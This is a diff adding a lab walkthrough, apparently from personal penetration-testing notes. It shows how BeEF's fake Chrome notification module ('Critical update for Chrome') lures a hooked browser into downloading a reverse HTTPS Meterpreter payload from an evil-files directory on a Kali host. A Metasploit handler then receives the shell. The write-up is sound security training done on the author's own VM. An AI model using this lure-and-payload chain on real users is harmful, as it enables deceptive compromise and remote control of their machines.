@@ -2607,3 +2607,154 @@ Verify Windows Target
 
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 
+
+ Exercise: Using BeEF Social Engineering to Trigger a Payload in a Lab
+
+> Lab Environment: Kali Linux + Windows 11 VM
+> Tool: BeEF (Browser Exploitation Framework)
+> Target Browser: Google Chrome
+> Purpose: Controlled lab demonstration
+
+ 1. Open the Social Engineering Modules
+
+After hooking the Google Chrome browser to BeEF, I navigated to:
+
+Commands → Social Engineering
+
+BeEF provides several social-engineering modules that can interact with the hooked browser.
+
+For this exercise, I selected the fake notification bar module for Chrome.
+
+---
+
+ 2. Configure the Notification
+
+The fake notification bar was configured to display a notification to the test user.
+
+For this lab, I used a message similar to:
+
+> Critical update for Chrome — Click here to install.
+
+The purpose was to demonstrate how a social-engineering notification can encourage interaction with a test file.
+
+<img width="1440" height="773" alt="Screenshot 2026-08-10 at 4 10 24 PM" src="https://github.com/user-attachments/assets/145317e1-7b76-4ee8-a4fa-801bb23ba945" />
+
+
+---
+
+ 3. Configure the Payload URL
+
+ I used the same payload generated earlier in my lab:
+
+```text
+rev_https_8080.exe
+```
+
+The payload was hosted on the Kali Linux Apache web server under the `evil-files` directory.
+
+The URL entered into the BeEF command was:
+
+```text
+http://<KALI-LINUX-IP>/evil-files/rev_https_8080.exe
+```
+
+In my lab, the Kali Linux IP was:
+
+```text
+172.16.219.133
+```
+
+Therefore, the complete test URL was:
+
+```text
+http://172.16.219.133/evil-files/rev_https_8080.exe
+```
+
+> Note: Replace `172.16.219.133` with the current IP address of your Kali Linux VM if it changes.
+
+ Screenshot
+
+<img width="1440" height="773" alt="Screenshot 2026-08-10 at 4 10 24 PM" src="https://github.com/user-attachments/assets/75cbde92-4bf9-4e0f-9aa0-4ec1f76c6f07" />
+
+---
+
+ 4. Execute the BeEF Command
+
+After configuring the notification and payload URL, I clicked Execute in BeEF.
+
+The hooked Chrome browser on the Windows 11 VM then displayed the configured notification.
+
+ Screenshot
+
+<img width="1440" height="302" alt="Screenshot 2026-08-10 at 4 10 47 PM" src="https://github.com/user-attachments/assets/37906570-f6ab-4324-92f8-aa90e08bc20e" />
+
+
+---
+
+ 5. Test the Payload Execution
+
+For this controlled lab, the notification was used to demonstrate the delivery and execution workflow against my own Windows 11 virtual machine.
+
+The downloaded file was:
+
+```text
+rev_https_8080.exe
+```
+
+This was the same reverse HTTPS Meterpreter payload created earlier for the isolated lab.
+
+<img width="1131" height="260" alt="Screenshot 2026-08-10 at 4 16 37 PM" src="https://github.com/user-attachments/assets/9e34db84-6134-4d5b-bef6-5d81168b940d" />
+
+---
+
+ 6. Establish the Meterpreter Session
+
+Before executing the payload, the Metasploit multi/handler was configured with the matching reverse HTTPS payload and listening settings.
+
+Once the test executable was run on the Windows 11 VM, the Kali Linux machine received the reverse connection.
+
+The successful connection resulted in a Meterpreter session.
+
+ Screenshot
+
+<img width="1437" height="230" alt="Screenshot 2026-08-10 at 4 16 25 PM" src="https://github.com/user-attachments/assets/d4ddbaa8-1385-4f32-8ba2-532eb1a992cc" />
+
+
+---
+
+ 7. Verify the Session
+
+After obtaining the Meterpreter session, I verified the connection using:
+
+```text
+sysinfo
+```
+
+This displayed information about the Windows 11 laboratory machine, confirming that the session had been established successfully.
+
+
+---
+
+ Result
+
+The exercise demonstrated the following workflow inside the isolated lab:
+
+```text
+BeEF Hooked Chrome
+        ↓
+Social Engineering Module
+        ↓
+Fake Chrome Notification
+        ↓
+Payload URL
+        ↓
+rev_https_8080.exe
+        ↓
+Meterpreter Reverse Connection
+        ↓
+Kali Linux
+```
+
+Key takeaway: BeEF can interact with a hooked Chrome browser through social-engineering modules, while the separately configured Metasploit handler can receive the reverse connection from a test payload executed inside the isolated lab.
+
+
